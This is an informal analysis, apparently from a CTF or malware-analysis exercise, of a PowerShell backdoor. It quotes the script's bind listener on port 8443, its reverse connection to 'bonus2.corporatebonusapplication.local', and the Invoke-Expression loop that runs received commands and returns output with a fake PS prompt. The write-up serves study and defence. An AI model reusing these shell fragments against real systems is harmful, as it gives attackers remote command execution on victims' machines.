ok we got some cool things ..

if ($Command -eq "bind")
    {
        $listener = [System.Net.Sockets.TcpListener]8443
        $listener.start()    
        $client = $listener.AcceptTcpClient()
    }

this nasty codes cheks some command variable for the word bind , if yes it basically starts a listener on <0.0.0.0:8443> and sits there waiting for someone to connect [-_-]

the second sussy thing here is this block : 

if ($Command -eq "reverse")
    {
        $client = New-Object System.Net.Sockets.TCPClient("bonus2.corporatebonusapplication.local",8443)
    }

so this code simply checks for a variable same as the one up and connects to this url [bonus2.corporatebonusapplication.local] , ok cool !

ok this looks so obvious it pulls in the attacker commands on does a (Invoke-Expression -Command ) SIMPLE SEARCH about Invoke-Expression states that its :
evaluates or runs a specified string as a command on the local computer

in simple words it runs the attacker commands , then 


       $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()

sends back the ouput for the attacker via the stream write . and its fansy if you look here : 

 $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
